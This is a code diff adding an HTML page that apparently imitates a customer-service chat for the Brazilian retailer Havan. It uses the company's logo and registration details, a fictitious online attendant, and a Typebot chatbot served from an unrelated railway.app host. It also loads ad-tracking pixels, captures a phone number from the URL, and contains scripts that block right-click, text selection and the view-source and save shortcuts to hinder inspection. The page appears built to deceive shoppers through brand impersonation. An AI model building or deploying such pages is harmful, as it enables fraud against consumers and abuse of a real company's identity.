@@ -1,0 +1,375 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <script>
+  window.pixelId = "678f8dea8a389097ee008320";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+
+    <script src="js/latest.js" data-utmify-prevent-subids async defer></script>
+
+    <meta http-equiv="content-type" content="text/html;charset=UTF-8">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-Frame-Options" content="SAMEORIGIN">
+    <meta http-equiv="Content-Security-Policy" content="default-src 'self' 'unsafe-inline' 'unsafe-eval' https: data: blob:;">
+    <title>Chat de Atendimento - Havan</title>
+    <link href="css/bootstrap.min.css" rel="stylesheet">
+    <style>
+        body {
+            background-color: #f9f9f9;
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+        }
+
+        .header {
+            background: rgb(255, 255, 255);
+            color: white;
+            padding: 15px 0;
+            text-align: center;
+        }
+
+        .header img {
+            width: 120px;
+        }
+
+        .chat-container {
+            max-width: 600px;
+            margin: 20px auto;
+            background-color: white;
+            border-radius: 10px;
+            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.1);
+            height: 70vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .chat-header {
+            background-color: #002279;
+            color: white;
+            padding: 15px 20px;
+            border-radius: 10px 10px 0 0;
+            display: flex;
+            align-items: center;
+        }
+
+        .agent-photo {
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            margin-right: 15px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .agent-photo img {
+            width: 100%;
+            height: 100%;
+            border-radius: 50%;
+            object-fit: cover;
+        }
+
+        .online-indicator {
+            position: absolute;
+            bottom: 2px;
+            right: 2px;
+            width: 12px;
+            height: 12px;
+            background-color: #4CAF50;
+            border-radius: 50%;
+            border: 2px solid white;
+        }
+
+        .agent-info h4 {
+            margin: 0;
+            font-size: 16px;
+        }
+
+        .agent-info p {
+            margin: 0;
+            font-size: 12px;
+            opacity: 0.8;
+        }
+
+        .typebot-container {
+            flex: 1;
+            padding: 0;
+            display: flex;
+            align-items: stretch;
+            justify-content: center;
+            background-color: #fafafa;
+            border-radius: 0 0 10px 10px;
+            margin-bottom: 20px; /* Espaço para o footer */
+            min-height: 400px; /* Altura mínima */
+            overflow: hidden;
+        }
+
+        .typebot-container typebot-standard {
+            width: 100% !important;
+            height: 100% !important;
+            min-height: 500px !important;
+            border: none !important;
+            border-radius: 0 !important;
+        }
+
+        /* Ajustes responsivos para o Typebot */
+        @media (max-width: 768px) {
+            .typebot-container {
+                margin-bottom: 30px; /* Mais espaço no mobile */
+                border-radius: 0; /* Remove bordas no mobile */
+                padding: 15px;
+                min-height: 350px; /* Altura menor no mobile */
+            }
+            
+            .typebot-container typebot-standard {
+                height: 400px !important; /* Altura específica no mobile */
+                max-height: 400px !important;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .typebot-container {
+                margin-bottom: 40px; /* Ainda mais espaço em telas pequenas */
+                padding: 10px;
+                min-height: 300px; /* Altura ainda menor */
+            }
+            
+            .typebot-container typebot-standard {
+                height: 350px !important; /* Altura específica para telas pequenas */
+                max-height: 350px !important;
+            }
+        }
+
+        .typebot-placeholder {
+            text-align: center;
+            color: #666;
+            font-size: 16px;
+            line-height: 1.6;
+        }
+
+        .typebot-placeholder .icon {
+            font-size: 48px;
+            margin-bottom: 20px;
+            color: #002279;
+        }
+
+        .typebot-placeholder .title {
+            font-size: 20px;
+            font-weight: bold;
+            color: #002279;
+            margin-bottom: 10px;
+        }
+
+        .typebot-placeholder .description {
+            font-size: 14px;
+            color: #888;
+            max-width: 300px;
+            margin: 0 auto;
+        }
+
+        .integration-info {
+            background-color: #e8f4fd;
+            border: 1px solid #b3d9f7;
+            border-radius: 8px;
+            padding: 15px;
+            margin-top: 20px;
+            font-size: 12px;
+            color: #0066cc;
+        }
+
+        .footer {
+            background: #ffffff;
+            border-top: 1px solid #e6e6e6;
+            text-align: center;
+            padding: 15px;
+            font-size: 10px;
+            color: #666;
+        }
+
+        .styles_company__HQYS3 {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            text-align: center;
+            gap: 24px;
+            padding: 24px 16px 32px;
+        }
+
+        .styles_company__HQYS3 p {
+            font-size: .75rem;
+            line-height: 16px;
+            letter-spacing: 0;
+        }
+
+        @media (max-width: 768px) {
+            .chat-container {
+                margin: 10px;
+                height: 75vh;
+                border-radius: 0;
+            }
+            
+            .chat-header {
+                border-radius: 0;
+            }
+            
+            .typebot-container {
+                border-radius: 0;
+            }
+        }
+
+        /* Estilos para quando o Typebot for integrado */
+        .typebot-widget {
+            width: 100%;
+            height: 100%;
+            border: none;
+            border-radius: 0 0 10px 10px;
+        }
+
+        /* Classe para ocultar o placeholder quando o Typebot estiver ativo */
+        .typebot-active .typebot-placeholder {
+            display: none;
+        }
+    </style>
+    <script>
+        if (document.addEventListener) {
+            document.addEventListener("keydown", bloquearSource);
+        } else {
+            document.attachEvent("onkeydown", bloquearSource);
+        }
+
+        function bloquearSource(e) {
+            e = e || window.event;
+            var code = e.which || e.keyCode;
+            if (e.ctrlKey && (code == 83 || code == 85)) {
+                if (e.preventDefault) {
+                    e.preventDefault();
+                } else {
+                    e.returnValue = false;
+                }
+                return false;
+            }
+        }
+    </script>
+    <style>
+        body {
+            -webkit-touch-callout: none;
+            -webkit-user-select: none;
+            -khtml-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+            user-select: none;
+        }
+
+        input, textarea {
+            -webkit-touch-callout: initial;
+            -webkit-user-select: text;
+            -khtml-user-select: text;
+            -moz-user-select: text;
+            -ms-user-select: text;
+            user-select: text;
+        }
+
+        [contenteditable=true] {
+            -webkit-touch-callout: initial;
+            -webkit-user-select: all;
+            -khtml-user-select: all;
+            -moz-user-select: all;
+            -ms-user-select: all;
+            user-select: all;
+        }
+    </style>
+    <script>
+        if (document.addEventListener) {
+            document.addEventListener("contextmenu", function (e) {
+                e.preventDefault();
+                return false;
+            });
+        } else {
+            document.attachEvent("oncontextmenu", function (e) {
+                e = e || window.event;
+                e.returnValue = false;
+                return false;
+            });
+        }
+    </script>
+
+    <script>
+        !function(e,t){"object" == typeof exports && "object" == typeof module ? module.exports = t() : "function" == typeof define && define.amd ? define([], t) : "object" == typeof exports ? exports.install = t() : e.install = t()}(window,(function(){return function(e){var t={ };function n(o){if(t[o])return t[o].exports;var r=t[o]={i:o,l:!1,exports:{ }};return e[o].call(r.exports,r,r.exports,n),r.l=!0,r.exports}return n.m=e,n.c=t,n.d=function(e,t,o){n.o(e, t) || Object.defineProperty(e, t, { enumerable: !0, get: o })},n.r=function(e){"undefined" != typeof Symbol && Symbol.toStringTag && Object.defineProperty(e, Symbol.toStringTag, { value: "Module" }), Object.defineProperty(e, "__esModule", { value: !0 })},n.t=function(e,t){if(1&t&&(e=n(e)),8&t)return e;if(4&t&&"object"==typeof e&&e&&e.__esModule)return e;var o=Object.create(null);if(n.r(o),Object.defineProperty(o,"default",{enumerable:!0,value:e}),2&t&&"string"!=typeof e)for(var r in e)n.d(o,r,function(t){return e[t]}.bind(null,r));return o},n.n=function(e){var t=e&&e.__esModule?function(){return e.default}:function(){return e};return n.d(t,"a",t),t},n.o=function(e,t){return Object.prototype.hasOwnProperty.call(e,t)},n.p="",n(n.s=0)}([function(e,t,n){"use strict";var o=this&&this.__spreadArray||function(e,t,n){if(n||2===arguments.length)for(var o,r=0,i=t.length;r<i;r++)!o&&r in t||(o||(o=Array.prototype.slice.call(t,0,r)),o[r]=t[r]);return e.concat(o||Array.prototype.slice.call(t))};Object.defineProperty(t,"__esModule",{value:!0});var r=function(e,t,n){var o,i=e.createElement("script");i.type="text/javascript",i.async=!0,i.src=t,n&&(i.onerror=function(){r(e, n)});var a=e.getElementsByTagName("script")[0];null===(o=a.parentNode)||void 0===o||o.insertBefore(i,a)};!function(e,t,n){e.KwaiAnalyticsObject = n;var i=e[n]=e[n]||[];i.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie"];var a=function(e,t){e[t] = function () { for (var n = [], r = 0; r < arguments.length; r++)n[r] = arguments[r]; var i = o([t], n, !0); e.push(i) }};i.methods.forEach((function(e){a(i, e)})),i.instance=function(e){var t,n=(null===(t=i._i)||void 0===t?void 0:t[e])||[];return i.methods.forEach((function(e){a(n, e)})),n},i.load=function(e,o){var a="../s1.kwai.net/kos/s101/nlav11187/pixel/events.html";i._i=i._i||{ },i._i[e]=[],i._i[e]._u=a,i._t=i._t||{ },i._t[e]=+new Date,i._o=i._o||{ },i._o[e]=o||{ };var c="?sdkid=".concat(e,"&lib=").concat(n);r(t,a+c,"../s16-11187.ap4r.com/kos/s101/nlav11187/pixel/events.html"+c)}}(window,document,"kwaiq")}])}));
+    </script>
+    <script>
+        kwaiq.load('510449167530721283');
+        kwaiq.page();
+    </script>
+
+    <script>
+        !function(e,t){"object" == typeof exports && "object" == typeof module ? module.exports = t() : "function" == typeof define && define.amd ? define([], t) : "object" == typeof exports ? exports.install = t() : e.install = t()}(window,(function(){return function(e){var t={ };function n(o){if(t[o])return t[o].exports;var r=t[o]={i:o,l:!1,exports:{ }};return e[o].call(r.exports,r,r.exports,n),r.l=!0,r.exports}return n.m=e,n.c=t,n.d=function(e,t,o){n.o(e, t) || Object.defineProperty(e, t, { enumerable: !0, get: o })},n.r=function(e){"undefined" != typeof Symbol && Symbol.toStringTag && Object.defineProperty(e, Symbol.toStringTag, { value: "Module" }), Object.defineProperty(e, "__esModule", { value: !0 })},n.t=function(e,t){if(1&t&&(e=n(e)),8&t)return e;if(4&t&&"object"==typeof e&&e&&e.__esModule)return e;var o=Object.create(null);if(n.r(o),Object.defineProperty(o,"default",{enumerable:!0,value:e}),2&t&&"string"!=typeof e)for(var r in e)n.d(o,r,function(t){return e[t]}.bind(null,r));return o},n.n=function(e){var t=e&&e.__esModule?function(){return e.default}:function(){return e};return n.d(t,"a",t),t},n.o=function(e,t){return Object.prototype.hasOwnProperty.call(e,t)},n.p="",n(n.s=0)}([function(e,t,n){"use strict";var o=this&&this.__spreadArray||function(e,t,n){if(n||2===arguments.length)for(var o,r=0,i=t.length;r<i;r++)!o&&r in t||(o||(o=Array.prototype.slice.call(t,0,r)),o[r]=t[r]);return e.concat(o||Array.prototype.slice.call(t))};Object.defineProperty(t,"__esModule",{value:!0});var r=function(e,t,n){var o,i=e.createElement("script");i.type="text/javascript",i.async=!0,i.src=t,n&&(i.onerror=function(){r(e, n)});var a=e.getElementsByTagName("script")[0];null===(o=a.parentNode)||void 0===o||o.insertBefore(i,a)};!function(e,t,n){e.KwaiAnalyticsObject = n;var i=e[n]=e[n]||[];i.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie"];var a=function(e,t){e[t] = function () { for (var n = [], r = 0; r < arguments.length; r++)n[r] = arguments[r]; var i = o([t], n, !0); e.push(i) }};i.methods.forEach((function(e){a(i, e)})),i.instance=function(e){var t,n=(null===(t=i._i)||void 0===t?void 0:t[e])||[];return i.methods.forEach((function(e){a(n, e)})),n},i.load=function(e,o){var a="../s1.kwai.net/kos/s101/nlav11187/pixel/events.html";i._i=i._i||{ },i._i[e]=[],i._i[e]._u=a,i._t=i._t||{ },i._t[e]=+new Date,i._o=i._o||{ },i._o[e]=o||{ };var c="?sdkid=".concat(e,"&lib=").concat(n);r(t,a+c,"../s16-11187.ap4r.com/kos/s101/nlav11187/pixel/events.html"+c)}}(window,document,"kwaiq")}])}));
+    </script>
+    <script>
+        kwaiq.load('261106540113615');
+        kwaiq.page();
+    </script>
+</head>
+
+<body>
+    <div class="header">
+        <img src="assets/havan.png" alt="Logo">
+    </div>
+
+    <div class="chat-container">
+        <!-- Chat Header -->
+        <div class="chat-header">
+            <div class="agent-photo">
+                <img src="juliana_silva.jpg" alt="Juliana Silva">
+                <div class="online-indicator"></div>
+            </div>
+            <div class="agent-info">
+                <h4>Julia Silva</h4>
+                <p>Atendente Online</p>
+            </div>
+        </div>
+
+        <!-- Container para Typebot -->
+        <div class="typebot-container typebot-active" id="typebotContainer">
+            <typebot-standard style="width: 100%; height: 100%;"></typebot-standard>
+        </div>
+
+
+    </div>
+
+    <!-- NOVO SCRIPT DO TYPEBOT -->
+    <script type="module">
+        import Typebot from 'https://cdn.jsdelivr.net/npm/@typebot.io/js@0/dist/web.js';
+      
+        Typebot.initStandard({
+          typebot: "my-typebot-1-fyv3417",
+          apiHost: "https://viewer-production-e969.up.railway.app",
+        });
+      </script>
+  
+
+    <!-- Footer -->
+    <div class="styles_company__HQYS3">
+        <div>
+            <p class="styles_description__590uc">HAVAN S.A. | CNPJ: 79.379.491.0008-50 | Rod. Antônio Heil, 250 - Centro II, Brusque - SC, 88353-100</p>
+            <p class="styles_description__590uc">© 2025 - Todos os direitos reservados</p>
+        </div>
+    </div>
+
+    <script>
+        // Captura o telefone dos parâmetros da URL
+        const urlParams = new URLSearchParams(window.location.search);
+        const phone = urlParams.get('phone');
+        
+        if (phone) {
+            console.log('Telefone capturado:', phone);
+            // Este telefone pode ser usado na integração com o Typebot
+        }
+    </script>
+</body>
+</html>
+
